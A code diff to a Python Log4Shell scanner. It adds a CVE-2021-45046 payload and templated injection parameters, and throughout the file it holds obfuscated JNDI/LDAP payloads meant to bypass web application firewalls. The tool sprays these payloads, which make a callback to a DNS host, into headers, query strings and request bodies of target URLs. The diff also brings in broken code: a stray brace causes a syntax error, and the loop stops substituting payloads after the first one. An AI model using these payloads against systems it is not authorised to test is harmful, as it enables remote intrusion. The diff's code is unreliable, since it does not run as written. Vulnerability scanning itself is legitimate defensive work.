@@ -16,7 +16,6 @@ import sys
 from urllib import parse as urlparse
 import base64
 import json
-import random
 from uuid import uuid4
 from base64 import b64encode
 from Crypto.Cipher import AES, PKCS1_OAEP
@@ -66,7 +65,12 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{
                        "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//{{callback_host}}/{{random}}}",
                        "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//{{callback_host}}/{{random}}}",
                        "${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//{{callback_host}}/{{random}}",
-                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{callback_host}}/{{random}}}"]
+                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{callback_host}}/{{random}}}"
+                       ]
+
+cve_2021_45046 = [
+                  "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}" # Source: https://twitter.com/marcioalm/status/1471740771581652995
+                 ]  
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
@@ -75,7 +79,7 @@ parser.add_argument("-u", "--url",
                     action='store')
 parser.add_argument("-p", "--proxy",
                     dest="proxy",
-                    help="send requests through proxy",
+                    help="Send requests through proxy. proxy should be specified in the format supported by requests (http[s]://<proxy-ip>:<proxy-port>)",
                     action='store')
 parser.add_argument("-l", "--list",
                     dest="usedlist",
@@ -109,6 +113,10 @@ parser.add_argument("--waf-bypass",
                     dest="waf_bypass_payloads",
                     help="Extend scans with WAF bypass payloads.",
                     action='store_true')
+parser.add_argument("--test-CVE-2021-45046",
+                    dest="cve_2021_45046",
+                    help="Test using payloads for CVE-2021-45046 (detection payloads).",
+                    action='store_true')
 parser.add_argument("--dns-callback-provider",
                     dest="dns_callback_provider",
                     help="DNS Callback provider (Options: dnslog.cn, interact.sh) - [Default: interact.sh].",
@@ -124,8 +132,8 @@ parser.add_argument("--disable-http-redirects",
                     action='store_true')
 parser.add_argument("--target-parameters",
                     dest="target_parameters",
-                    help="Provide target paramters seperated by commas (Default : v)",
-                    default="v",
+                    help="Provide target paramters (Ex: 'param1=value1&param2={{inject}}&param3={{inject}}' (Default : v)",
+                    default="v={{inject}}",
                     action='store')
 
 args = parser.parse_args()
@@ -137,7 +145,7 @@ if args.proxy:
 
 
 if args.target_parameters:
-    args.target_parameters = args.target_parameters.split(',')
+    args.target_parameters = { i.split('=',1)[0] : i.split('=',1)[1] for i in args.target_parameters.split('&')}
 
 
 def get_fuzzing_headers(payload):
@@ -284,51 +292,55 @@ def scan_url(url, callback_host):
     payloads = [payload]
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
-
+    if args.cve_2021_45046:
+        payloads = cve_2021_45046
     for payload in payloads:
         cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
-        for param in args.target_parameters:
-            if args.request_type.upper() == "GET" or args.run_all_tests:
-                try:
-                    requests.request(url=url,
-                                    method="GET",
-                                    params={param: payload},
-                                    headers=get_fuzzing_headers(payload),
-                                    verify=False,
-                                    timeout=timeout,
-                                    allow_redirects=(not args.disable_redirects),
-                                    proxies=proxies)
-                except Exception as e:
-                    cprint(f"EXCEPTION: {e}")
+        for key, val in args.target_parameters.items():
+            if val == '{{inject}}':
+                args.target_parameters[key] = val.replace('{{inject}}', payload)
 
-            if args.request_type.upper() == "POST" or args.run_all_tests:
-                try:
-                    # Post body
-                    requests.request(url=url,
-                                    method="POST",
-                                    params={param: payload},
-                                    headers=get_fuzzing_headers(payload),
-                                    data=get_fuzzing_post_data(payload),
-                                    verify=False,
-                                    timeout=timeout,
-                                    allow_redirects=(not args.disable_redirects),
-                                    proxies=proxies)
-                except Exception as e:
-                    cprint(f"EXCEPTION: {e}")
+        if args.request_type.upper() == "GET" or args.run_all_tests:
+            try:
+                requests.request(url=url,
+                                 method="GET",
+                                 params=args.target_parameters,
+                                 headers=get_fuzzing_headers(payload),
+                                 verify=False,
+                                 timeout=timeout,
+                                 allow_redirects=(not args.disable_redirects),
+                                 proxies=proxies)
+            except Exception as e:
+                cprint(f"EXCEPTION: {e}")
 
-                try:
-                    # JSON body
-                    requests.request(url=url,
-                                    method="POST",
-                                    params={param: payload},
-                                    headers=get_fuzzing_headers(payload),
-                                    json=get_fuzzing_post_data(payload),
-                                    verify=False,
-                                    timeout=timeout,
-                                    allow_redirects=(not args.disable_redirects),
-                                    proxies=proxies)
-                except Exception as e:
-                    cprint(f"EXCEPTION: {e}")
+        if args.request_type.upper() == "POST" or args.run_all_tests:
+            try:
+                # Post body
+                requests.request(url=url,
+                                 method="POST",
+                                 params=args.target_parameters},
+                                 headers=get_fuzzing_headers(payload),
+                                 data=get_fuzzing_post_data(payload),
+                                 verify=False,
+                                 timeout=timeout,
+                                 allow_redirects=(not args.disable_redirects),
+                                 proxies=proxies)
+            except Exception as e:
+                cprint(f"EXCEPTION: {e}")
+
+            try:
+                # JSON body
+                requests.request(url=url,
+                                 method="POST",
+                                 params=args.target_parameters,
+                                 headers=get_fuzzing_headers(payload),
+                                 json=get_fuzzing_post_data(payload),
+                                 verify=False,
+                                 timeout=timeout,
+                                 allow_redirects=(not args.disable_redirects),
+                                 proxies=proxies)
+            except Exception as e:
+                cprint(f"EXCEPTION: {e}")
 
 
 def main():
@@ -346,7 +358,7 @@ def main():
     dns_callback_host = ""
     if args.custom_dns_callback_host:
         cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
-        dns_callback_host =  args.custom_dns_callback_host
+        dns_callback_host = args.custom_dns_callback_host
     else:
         cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
         if args.dns_callback_provider == "interact.sh":
@@ -371,7 +383,7 @@ def main():
     time.sleep(int(args.wait_time))
     records = dns_callback.pull_logs()
     if len(records) == 0:
-        cprint("[•] Targets does not seem to be vulnerable.", "green")
+        cprint("[•] Reachable Targets do not seem to be vulnerable.", "green")
     else:
         cprint("[!!!] Target Affected", "yellow")
         for i in records:
